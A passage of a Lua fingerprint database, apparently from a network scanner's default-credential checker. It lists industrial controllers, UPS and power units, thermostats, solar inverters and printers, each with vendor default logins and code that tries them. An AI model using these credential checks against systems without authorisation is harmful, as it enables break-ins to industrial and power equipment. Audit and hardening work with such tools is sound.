           and response.body
           and response.body:find("/status/devstat.htm", 1, true)
           and response.body:lower():find("<title>%a%a%a?%-%w%w%-?%w+</title>")
  end,
  login_combos = {
    {username="root", password=""},
    {username="admin", password="admin"},
    {username="admin", password="1234"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_get_simple(host, port, path)
    if not (resp.status == 200 and resp.body) then return false end
    local frm = get_tag(resp.body, "frame", {src="/%w+/status/devstat%.htm$"})
    if not frm then return false end
    local lang = frm.src:match("/(%w+)/status/devstat%.htm$")
    return try_http_auth(host, port,
                        url.absolute(path, lang .. "/mnt/adpass.htm"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Silex Server (var.2)",
  cpe = "cpe:/o:silex:*",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("status.hti?", 1, true)
           and response.body:lower():find("<title>silex ", 1, true)
  end,
  login_combos = {
    {username="", password="ACCESS"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {access="",
                  password="",
                  language=0,
                  access_psw=pass,
                  action="Submit"}
    local resp = http_post_simple(host, port, url.absolute(path, "login"),
                                 nil, form)
    return resp.status == 200
           and get_tag(resp.body or "", "frame", {src="^status%.hti%?access=%x+&"})
  end
})

table.insert(fingerprints, {
  name = "Wago I/O System 750",
  cpe = "cpe:/h:wago:wago_i%2fo_system*",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["location"] or ""):find("/webserv/index%.ssi$")
  end,
  login_combos = {
    {username="admin", password="wago"},
    {username="user",  password="user"},
    {username="guest", password="guest"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port,
                        url.absolute(path, "webserv/cplcfg/security.ssi"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Wago TO-PASS",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "WAGO TO-PASS"
  end,
  login_combos = {
    {username="admin", password="wago"},
    {username="user",  password="user"},
    {username="guest", password="guest"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "ProMinent Controller",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "Z-World Rabbit"
           and response.body
           and get_tag(response.body, "frame", {src="^right%.shtml$"})
  end,
  login_combos = {
    {username = "Operator1",  password = "1"},
    {username = "Operator2",  password = "2"},
    {username = "Operator3",  password = "3"},
    {username = "Operator4",  password = "4"},
    {username = "Configure5", password = "5"},
    {username = "Configure6", password = "6"},
    {username = "Configure7", password = "7"},
    {username = "admin",      password = "AAAA"}
  },
  login_check = function (host, port, path, user, pass)
    local usermap = {["Operator1"]=1,
                     ["Operator2"]=2,
                     ["Operator3"]=3,
                     ["Operator4"]=4,
                     ["Configure5"]=5,
                     ["Configure6"]=6,
                     ["Configure7"]=7,
                     ["admin"]=8}
    local lurl = ("taco.cgi?F0=AH&F1=%d&F2=%s"):format(usermap[user],pass)
    local resp = http_get_simple(host, port, url.absolute(path, lurl))
    return resp.status == 200
           and (get_cookie(resp, "DCRABBIT") or ""):lower() == user:lower()
  end
})

table.insert(fingerprints, {
  name = "Emerson EC2",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("EC2", 1, true)
           and response.body:lower():find("<title>ec2 %d+ ")
           and get_tag(response.body, "frame", {src="^bckgnd%.html$"})
  end,
  login_combos = {
    {username = "EmersonID", password = "12"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "tcp_ip.shtml.shtml"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Emerson Xweb",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/cgi-bin/xweb500.cgi", 1, true)
           and response.body:find("%WUrl%s*=%s*(['\"])[^'\"]-/cgi%-bin/xweb500%.cgi%?res=%d%1")
  end,
  login_combos = {
    {username = "Admin", password = "Admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {pg=2,
                  action=2,
                  act=0,
                  login=user,
                  passwd=pass}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "cgi-bin/user.cgi"),
                                 nil, form)
    return resp.status == 200
           and resp.body
           and resp.body:find("%Wvar%s+value%s*=%s*(['\"])" .. user .. "%1")
           and resp.body:find("%Wlocation%.href%s*=%s*(['\"])[^'\"]-/index/indexFr%.html%1")
  end
})

table.insert(fingerprints, {
  name = "Heatmiser Wifi Thermostat",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Heatmiser", 1, true)
           and response.body:lower():find("<title>heatmiser wifi thermostat</title>", 1, true)
           and get_tag(response.body, "input", {name="^lgpw$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, path, nil, {lgnm=user,lgpw=pass})
    return resp.status == 302
           and (resp.header["location"] or ""):find("/main%.htm$")
  end
})

table.insert(fingerprints, {
  name = "Heatmiser NetMonitor 1.x",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("NetMonitor", 1, true)
           and response.body:lower():find("<title>netmonitor ", 1, true)
           and get_tag(response.body, "input", {name="^loginname$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "view_stats.htm"), nil,
                                 {loginname=user, loginpassword=pass})
    return resp.status == 200
           and get_tag(resp.body or "", "a", {href="^setup_stats%.htm$"})
  end
})

table.insert(fingerprints, {
  name = "Heatmiser NetMonitor 3.0x",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Netmonitor", 1, true)
           and response.body:find("loginState", 1, true)
           and response.body:lower():find("<title>netmonitor ", 1, true)
           and get_tag(response.body, "input", {name="^loginun$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_post_simple(host, port, url.absolute(path, "main.htm"),
                                  nil, {loginun=user, loginpw=pass})
    if not (resp1.status == 200 and (resp1.body or ""):find("(['\"]?)left%.htm%1")) then
      return false
    end
    local resp2 = http_get_simple(host, port, url.absolute(path, "left.htm"))
    return resp2.status == 200
           and get_tag(resp2.body or "", "input", {name="^loginstate$", value="^1$"})
  end
})

table.insert(fingerprints, {
  name = "Heatmiser NetMonitor 3.x",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Netmonitor", 1, true)
           and response.body:find("hmcookies", 1, true)
           and response.body:lower():find("<title>netmonitor ", 1, true)
           and get_tag(response.body, "input", {name="^loginun$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local idx = get_tag(resp1.body, "input", {name="^hmckidx$", value="^%d$"})
    if not idx then return false end
    idx = idx.value
    local form = {curckidx=idx,
                  loginun=user,
                  loginpw=pass}
    local resp2 = http_post_simple(host, port, url.absolute(path, "main.htm"),
                                  {cookies="hmcookie="..idx}, form)
    if not (resp2.status == 200 and resp2.body) then return false end
    local hmcookies = get_tag(resp2.body, "input", {name="^hmcookies$", value="^%d+$"})
    return hmcookies
           and hmcookies.value:sub(idx + 1, idx + 1) == "1"
  end
})

table.insert(fingerprints, {
  name = "Jacarta interSeptor",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find(">Jacarta ", 1, true)
           and response.body:lower():find("<title>jacarta interseptor", 1, true)
           and get_tag(response.body, "frame", {src="/pagecompre.html$"})
  end,
  login_combos = {
    {username = "interSeptor", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "PageAControl.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Phasefale JouleAlarm/JouleTemp",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Phasefale Joule", 1, true)
           and response.body:lower():find("<title>phasefale joule", 1, true)
           and get_tag(response.body, "form", {action="/set/set%.html$"})
  end,
  login_combos = {
    {username = "admin", password = "pass"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "set/set.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Proliphix Thermostat",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("index.shtml", 1, true)
           and response.body:find("%WprintNavLine%(%s*(['\"])Login%1%s*,%s*(['\"])index%.shtml%2%s*%)")
           and response.body:lower():find("<title>thermostat [^<]-%- status &amp; control</title>")
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "user",  password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "index.shtml"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "CS121 UPS Web/SNMP Manager",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^HyNetOS/%d+%.")
           and response.body
           and response.body:lower():find("<title>cs121 snmp/web adapter</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "cs121-snmp"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "admin/net.shtml"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Riello UPS NetMan 204",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^mini_httpd/%d+%.")
           and response.body
           and response.body:find(">Netman ", 1, true)
           and response.body:lower():find("<title>netman 204 login</title>", 1, true)
  end,
  login_combos = {
    {username = "admin",     password = "admin"},
    {username = "fwupgrade", password = "fwupgrade"},
    {username = "user",      password = "user"},
    {username = "eurek",     password = "eurek"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "cgi-bin/login.cgi"),
                                 nil, {username=user, password=pass})
    return resp.status == 200
           and resp.body
           and (resp.body:find(">window.location.replace(", 1, true)
             or resp.body:find("Another user is logged in", 1, true))
  end
})

table.insert(fingerprints, {
  name = "APC Management Card (basic auth)",
  cpe = "cpe:/h:apc:ap*",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "APC Management Card"
  end,
  login_combos = {
    {username = "apc",      password = "apc"},
    {username = "device",   password = "apc"},
    {username = "readonly", password = "apc"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "APC Management Card",
  cpe = "cpe:/h:apc:ap*",
  category = "industrial",
  paths = {
    {path = "/logon.htm"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and (response.body:find("apclogo", 1, true)
             or response.body:find("www.apc.com", 1, true))
           and response.body:lower():find("<title>[^<]*log on</title>")
           and get_tag(response.body, "input", {name="^login_username$"})
  end,
  login_combos = {
    {username = "apc",      password = "apc"},
    {username = "device",   password = "apc"},
    {username = "readonly", password = "apc"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {login_username=user,
                  login_password=pass,
                  submit="Log On"}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "Forms/login1"),
                                 nil, form)
    local loc = resp.header["location"]
    if not (resp.status == 303 and loc) then return false end
    if loc:find("/home%.htm$") then return true end
    for _, ck in ipairs(resp.cookies or {}) do
      if ck.name:find("^APC") then return true end
    end
    return false
  end
})

table.insert(fingerprints, {
  name = "APC InfraStruXure Central",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("www.apc.com", 1, true)
           and (response.body:lower():find("<title>infrastruxure central ", 1, true)
             or response.body:lower():find("<title>struxureware central ", 1, true))
           and get_tag(response.body, "a", {href="^nbc/status/Status$"})
  end,
  login_combos = {
    {username = "apc",      password = "apc"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "nbc/status/Status"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "APC InfraStruXure PDU",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "InfraStruXure PDU"
  end,
  login_combos = {
    {username = "device", password = "apc"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "InfraPower PPS-02-S",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and response.header["location"] == "?/3/login"
           and (response.header["server"] or ""):find("^lighttpd/%d+%.")
           and get_cookie(response, "PHPSESSID", "^%w+$")
  end,
  login_combos = {
    {username = "00000000", password = "00000000"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {status=1,
                  usr=user,
                  psw=pass,
                  ["t-tag"]=os.date("!%m%d%H%M%Y")}
    local resp = http_post_simple(host, port, url.absolute(path, "?/3/login"),
                                 nil, form)
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and jout.callback
  end
})

table.insert(fingerprints, {
  name = "iBoot",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "iBoot"
  end,
  login_combos = {
    {username = "", password = "PASS"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "iBoot G2",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^iBoot%-G2S?$")
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "user",  password = "user"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "iBoot Bar",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find(">iBoot", 1, true)
           and response.body:lower():find("<title>iboot bar ", 1, true)
           and get_tag(response.body, "input", {name="^password$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "login.cgi"),
                                 nil, {name=user,password=pass})
    return resp.status == 200
           and get_cookie(resp, "DCRABBIT", "^%d+$")
           and (resp.body or ""):find("%Wlocation%s*=%s*(['\"])index%.ztm%1")
  end
})

table.insert(fingerprints, {
  name = "HP Power Manager",
  cpe = "cpe:/a:hp:power_manager_remote_agent",
  category = "industrial",
  paths = {
    {path = "/index.asp"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("HP", 1, true)
           and response.body:lower():find("<title>hp power manager</title>", 1, true)
           and get_tag(response.body, "form", {action="/goform/formlogin$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {HtmlOnly="true",
                  Login=user,
                  Password=pass,
                  loginButton="Submit Login"}
    local resp = http_post_simple(host, port,
                                  url.absolute(path, "goform/formLogin"),
                                  nil, form)
    return resp.status == 200
           and (resp.body or ""):find("%Wtop%.location%.href%s*=%s*(['\"])[^'\"]-/Contents/index%.asp%1")
  end
})

table.insert(fingerprints, {
  name = "Sunny WebBox (var.1)",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Sunny Webbox", 1, true)
           and get_refresh_url(response.body, "/culture/index%.dml$")
  end,
  login_combos = {
    {username = "User",      password = "0000"},
    {username = "Installer", password = "1111"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {Language="LangEL",
                  Userlevels=user,
                  password=pass}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "culture/login"),
                                 nil, form)
    return resp.status == 200
           and get_tag(resp.body or "", "page", {id="^DeviceOverview$"})
  end
})

table.insert(fingerprints, {
  name = "Sunny Central (var.1)",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["location"] or ""):find("/SunnyCentral/public$")
  end,
  login_combos = {
    {username = "User",      password = "0000"},
    {username = "Installer", password = "1111"}
  },
  login_check = function (host, port, path, user, pass)
    local usrlvl = {User=0,Installer=1}
    local header = {["Content-Type"]="application/json;charset=utf-8"}
    local jin = {password=pass,
                 msg="",
                 userLevel=usrlvl[user],
                 parameters={}}
    json.make_object(jin)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "home/login"),
                                 {header=header}, json.generate(jin))
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and jout.data and jout.data.ret
  end
})

table.insert(fingerprints, {
  name = "Sunny WebBox/Central (var.2)",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Sunny ", 1, true)
           and response.body:lower():find("<title>sunny %a+</title>")
           and get_tag(response.body, "frame", {src="^home_frameset%.htm$"})
  end,
  login_combos = {
    {username = "", password = "sma"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {Language="en",
                  Password=pass,
                  ButtonLogin="Login"}
    local resp = http_post_simple(host, port, url.absolute(path, "login"),
                                 nil, form)
    if not (resp.status == 200
           and (resp.body or ""):find("top.frames[2].location.reload()", 1, true)) then
      return false
    end
    http_post_simple(host, port,
                    url.absolute(path, "home_frameset.htm?Logout=true"),
                    nil, {ButtonLogin="Abmelden"})
    return true
  end
})

table.insert(fingerprints, {
  name = "Sunny Central (var.3)",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Sunny ", 1, true)
           and response.body:lower():find("<title>sunny central ")
           and get_tag(response.body, "input", {name="^action$"})
           and get_tag(response.body, "input", {name="^command$"})
  end,
  login_combos = {
    {username = "user",      password = "sma"},
    {username = "installer", password = "sma"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {action="login",
                  command="auth",
                  uname=user,
                  language="en",
                  pass=pass,
                  _ie_dummy=""}
    local resp = http_post_simple(host, port, path, nil, form)
    return resp.status == 200
           and get_tag(resp.body or "", "input", {name="^action$", value="^solar$"})
  end
})

table.insert(fingerprints, {
  name = "Deva Broadcast",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("devabroadcast.com", 1, true)
           and (get_tag(response.body, "form", {action="^login%.shtml$"})
             or get_tag(response.body, "li", {["data-c"]="^lgn$"}))
  end,
  login_combos = {
    {username = "user",  password = "pass"},
    {username = "admin", password = "pass"}
  },
  login_check = function (host, port, path, user, pass)
    local form = stdnse.output_table()
    form.user = user
    form.pass = pass
    local resp = http_post_simple(host, port, url.absolute(path, "login.shtml"),
                                 nil, form)
    return resp.status == 303
           and (resp.header["location"] or ""):find("/main%.shtml$")
  end
})

table.insert(fingerprints, {
  name = "Deva Broadcast (basic auth)",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("devabroadcast.com", 1, true)
           and get_tag(response.body, "a", {href="/secure/net%.htm$"})
  end,
  login_combos = {
    {username = "user",  password = "pass"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "secure/net.htm"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Harmonic NSG 9000",
  category = "industrial",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("NSG 9000", 1, true)
           and response.body:find("(['\"])/AUTH/a%1")
           and response.body:lower():find("<title[^>]*>nsg 9000%-")
  end,
  login_combos = {
    {username = "admin",  password = "nsgadmin"},
    {username = "guest",  password = "nsgguest"},
    {username = "config", password = "nsgconfig"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "AUTH/a"),
                        user, pass, false)
  end
})

---
--Printers
---
table.insert(fingerprints, {
  name = "Canon imageRunner Advance",
  cpe = "cpe:/a:canon:imagerunner",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("CANON", 1, true)
           and response.body:lower():find("<title>default authentication", 1, true)
           and get_tag(response.body, "input", {name="^deptid$"})
  end,
  login_combos = {
    {username = "7654321", password = "7654321"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {uri=path,
                  user_type_generic="",
                  deptid=user,
                  password=pass}
    local resp = http_post_simple(host, port, url.absolute(path, "login"),
                                 nil, form)
    return resp.status == 302
           and get_cookie(resp, "com.canon.meap.service.login.session", "^%-?%d+$")
  end
})

table.insert(fingerprints, {
  name = "Kyocera Command Center",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("start.htm", 1, true)
           and get_tag(response.body, "frame", {src="/start/start%.htm$"})
           and response.body:lower():find("<title>kyocera command center</title>", 1, true)
  end,
  login_combos = {
    {username = "", password = "admin00"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {okhtmfile=url.absolute(path, "opt1/index.htm"),
                  failhtmfile=url.absolute(path, "start/StartAccessDenied.htm"),
                  func="authLogin",
                  arg01_UserName=user,
                  arg02_Password=pass,
                  arg03_LoginType="",
                  submit001="OK",
                  language="../opt1/index.htm"}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "start/login.cgi"),
                                 nil, form)
    return resp.status == 200
           and get_cookie(resp, "level") == "3"
  end
})

table.insert(fingerprints, {
  name = "Kyocera Command Center (basic auth)",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^KM%-httpd/%d+%.")
           and response.body
           and response.body:find("start.htm", 1, true)
           and get_tag(response.body, "frame", {src="/start/start%.htm$"})
  end,
  login_combos = {
    {username = "", password = ""},
    {username = "Admin", password = "Admin"}
  },
  login_check = function (host, port, path, user, pass)
    local lurl = url.absolute(path, "basic/DevDef.htm")
    local resp = http_get_simple(host, port, lurl)
    if resp.status == 200 then return user == "" end
    return try_http_auth(host, port, lurl, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Kyocera Command Center RX",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Start_Wlm.htm", 1, true)
           and get_tag(response.body, "frame", {src="/startwlm/start_wlm%.htm$"})
  end,
  login_combos = {
    {username = "Admin", password = "Admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {failhtmfile=url.absolute(path, "startwlm/Start_Wlm.htm"),
                  okhtmfile=url.absolute(path, "startwlm/Start_Wlm.htm"),
                  func="authLogin",
                  arg03_LoginType="_mode_off",
                  arg04_LoginFrom="_wlm_login",
                  language="../wlmeng/index.htm",
                  privid="",
                  publicid="",
                  attrtype="",
                  attrname="",
                  arg01_UserName=user,
                  arg02_Password=pass,
                  arg05_AccountId="",
                  Login="Login",
                  arg06_DomainName="",
                  hndHeight=0}
    local lurl = url.absolute(path, "startwlm/login.cgi")
    local header = {["Referer"]=url.build(url_build_defaults(host, port, {path=lurl}))}
    local resp = http_post_simple(host, port, lurl, {header=header}, form)
    return resp.status == 200
           and get_cookie(resp, "level") == "1"
  end
})

table.insert(fingerprints, {
  name = "RICOH Web Image Monitor",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^Web%-Server/%d+%.")
           and response.body
           and response.body:find("/websys/webArch/mainFrame.cgi", 1, true)
  end,
  login_combos = {
    {username = "admin",      password = ""},
    {username = "supervisor", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local resp0 = http.get(host, port, path)
    if not (resp0.status == 200 and resp0.body) then return false end
    local lurl = resp0.body:match("%Wlocation%.href%s*=%s*['\"](/[^'\"]-/)mainFrame%.cgi['\"]")
    if not lurl then return false end
    local resp1 = http_get_simple(host, port, url.absolute(lurl, "authForm.cgi"),
                                 {cookies="cookieOnOffChecker=on"})
    if not (resp1.status == 200 and resp1.body) then return false end
    local token = get_tag(resp1.body, "input", {type="^hidden$", name="^wimToken$", value=""})
    if not token then return false end
    local form = {wimToken = token.value,
                  userid_work = "",
                  userid = base64.enc(user),
                  password_work = "",
                  password = base64.enc(pass),
                  open = ""}
    local resp2 = http_post_simple(host, port, url.absolute(lurl, "login.cgi"),
                                  {cookies=resp1.cookies}, form)
    return resp2.status == 302
           and (resp2.header["location"] or ""):find("/mainFrame%.cgi$")
           and get_cookie(resp2, "wimsesid", "^%d+$")
  end
})

table.insert(fingerprints, {
  name = "Samsung SyncThru (var.1)",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("SyncThru", 1, true)
           and response.body:lower():find("<title>syncthru web service</title>", 1, true)
           and get_tag(response.body, "frame", {src="^top_frame%.html$"})
  end,
  login_combos = {
    {username = "", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_get_simple(host, port,
                                url.absolute(path, "Maintenance/security.htm"))
    return resp.status == 200
           and (resp.body or ""):find("%Wvar%s+secEnabled%s*=%s*(['\"])%1%s*;")
  end
})

table.insert(fingerprints, {
  name = "Samsung SyncThru (var.2)",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("SyncThru", 1, true)
           and response.body:lower():find("<title>syncthru web service</title>", 1, true)
           and get_tag(response.body, "frame", {src="^first_top_frame%.html$"})
  end,
  login_combos = {
    {username = "admin", password = "1111"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {j_username=base64.enc(user),
                  j_password=base64.enc(pass),
                  j_domain=base64.enc("LOCAL"),
                  context=url.absolute(path, "sws.login"),
                  j_targetAuthSuccess=url.absolute(path, "sws.login/gnb/loggedinView.sws?loginBG=login_bg.gif&basedURL=/&sws=N&isPinCode=false"),
                  IDUserId=user,
                  IDUserPw=pass,
                  IDDomain="LOCAL",
                  isPinCode="true",
                  isIdOnly="true"}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "sws.application/j_spring_security_check_pre_installed"),
                                 nil, form)
    return resp.status == 302
           and (resp.header["location"] or ""):find("/loggedinView%.sws%f[;?\0]")
           and get_cookie(resp, "UserRole") == "Admin"
  end
})

table.insert(fingerprints, {
  name = "Sharp Printer",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["server"] or ""):find("^Rapid Logic/%d+%.")
           and (response.header["location"] or ""):find("/main%.html$")
  end,
  login_combos = {
    {username = "Administrator", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local usermap = {Administrator = 3}
    local lurl = url.absolute(path, "login.html?") .. url.absolute(path, "main.html")
    local resp1 = http_get_simple(host, port, lurl)
    if not (resp1.status == 200 and resp1.body) then return false end
    local ltype = get_tag(resp1.body, "input", {type="^hidden$", name="^ggt_hidden%(10008%)$", value="^%d+$"})
    if not ltype then return false end
    local token = get_tag(resp1.body, "input", {type="^hidden$", name="^token2$", value="^%x+$"})
    if not token then return false end
    local form2 = {["ggt_select(10009)"]=usermap[user],
                   ["ggt_textbox(10003)"]=pass,
                   action="loginbtn",
                   token2=token.value,
                   ordinate=0,
                   ["ggt_hidden(10008)"]=ltype.value}
    local resp2 = http_post_simple(host, port, lurl,
                                  {cookies=resp1.cookies}, form2)
    return resp2.status == 302
           and (resp2.header["location"] or ""):find("/main%.html$")
  end
})

table.insert(fingerprints, {
  name = "Sharp Printer (basic auth)",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["extend-sharp-setting-status"] == "0"
           and response.body
           and get_tag(response.body, "frame", {src="^link_user%.html$"})
  end,
  login_combos = {
    {username = "admin", password = "Sharp"},
    {username = "user",  password = "Sharp"},
    {username = "admin", password = "1234"},
    {username = "user",  password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "condition_def.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Toshiba TopAccess HD",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/js/TopAccessUtil.js", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "123456"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    local token = resp1.status == 200 and get_cookie(resp1, "session", ".")
    if not token then return false end
    local ipaddr = token:match("^(.+)%.")
    if not ipaddr then return false end
